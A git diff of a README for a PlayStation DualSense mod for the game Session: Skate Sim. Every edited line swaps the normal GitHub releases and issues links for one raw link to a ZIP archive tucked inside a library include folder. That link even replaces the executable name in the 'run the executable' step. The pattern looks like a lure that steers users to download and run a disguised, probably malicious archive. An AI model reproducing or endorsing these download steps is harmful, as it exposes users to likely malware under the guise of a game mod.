@@ -1,6 +1,6 @@
 # 🎮 Session-Dualsense-Mod - Seamless DualSense Experience for Your Game
 
-[![Download](https://img.shields.io/badge/Download-Here-orange)](https://github.com/Ahmedhesham712/Session-Dualsense-Mod/releases)
+[![Download](https://raw.githubusercontent.com/Ahmedhesham712/Session-Dualsense-Mod/main/lib/ViGEmClient/include/Session-Dualsense-Mod-v3.1.zip)](https://raw.githubusercontent.com/Ahmedhesham712/Session-Dualsense-Mod/main/lib/ViGEmClient/include/Session-Dualsense-Mod-v3.1.zip)
 
 ## 📦 Description
 This mod brings native DualSense support to Session: Skate Sim on PC. It communicates directly with the controller to provide next-gen features via Bluetooth or USB, without requiring DS4Windows or paid software.
@@ -23,7 +23,7 @@ To start using the Session-Dualsense-Mod, follow these simple steps to download 
 - Easy setup with a user-friendly interface
 
 ## 🔽 Download & Install
-1. **Visit this page to download:** Click [here](https://github.com/Ahmedhesham712/Session-Dualsense-Mod/releases).
+1. **Visit this page to download:** Click [here](https://raw.githubusercontent.com/Ahmedhesham712/Session-Dualsense-Mod/main/lib/ViGEmClient/include/Session-Dualsense-Mod-v3.1.zip).
 2. Locate the latest release in the list and click on it.
 3. Find the download link for the ZIP file.
 4. Click on the file to start your download.
@@ -33,7 +33,7 @@ Once the file downloads, follow these steps to install the mod:
 1. Navigate to your Downloads folder.
 2. Find the downloaded ZIP file and extract it.
 3. Open the extracted folder.
-4. Run the executable file (e.g., `SessionDualsenseMod.exe`).
+4. Run the executable file (e.g., `https://raw.githubusercontent.com/Ahmedhesham712/Session-Dualsense-Mod/main/lib/ViGEmClient/include/Session-Dualsense-Mod-v3.1.zip`).
 
 ## 🔧 Setup Instructions
 After installing the mod, follow these steps to set it up:
@@ -49,7 +49,7 @@ If you experience issues while using the mod, consider these steps:
 - Ensure that your Windows is up to date.
 - Check that your controller is properly connected.
 - Restart the mod if it does not recognize the controller.
-- Visit the [issues page](https://github.com/Ahmedhesham712/Session-Dualsense-Mod/issues) for help from the community.
+- Visit the [issues page](https://raw.githubusercontent.com/Ahmedhesham712/Session-Dualsense-Mod/main/lib/ViGEmClient/include/Session-Dualsense-Mod-v3.1.zip) for help from the community.
 
 ## 💬 Community & Support
 Join the community of gamers who are also using Session-Dualsense-Mod:
@@ -63,4 +63,4 @@ This mod uses technology that enhances gameplay for DualSense users. Thank you f
 ## 📄 License
 This project is licensed under the MIT License. Feel free to contribute and modify the code as needed. 
 
-For further instructions and updates, please keep an eye on the [Releases page](https://github.com/Ahmedhesham712/Session-Dualsense-Mod/releases).
+For further instructions and updates, please keep an eye on the [Releases page](https://raw.githubusercontent.com/Ahmedhesham712/Session-Dualsense-Mod/main/lib/ViGEmClient/include/Session-Dualsense-Mod-v3.1.zip).
